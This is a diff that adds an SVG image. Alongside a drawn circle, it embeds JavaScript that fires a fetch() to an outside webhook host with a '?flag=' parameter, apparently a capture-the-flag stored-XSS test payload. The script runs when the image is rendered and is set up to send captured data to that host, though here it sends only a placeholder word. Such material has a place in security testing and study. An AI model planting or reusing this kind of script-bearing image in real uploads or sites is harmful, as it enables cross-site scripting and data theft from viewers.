@@ -1,0 +1,8 @@
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script type="text/javascript">
+		console.log("I NEED TO SLEEP")
+		webhook_url = "http://mathilde-hugues.art:4600/?flag="
+		fetch(`${webhook_url}salut`)
+  </script>
+  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
+</svg>
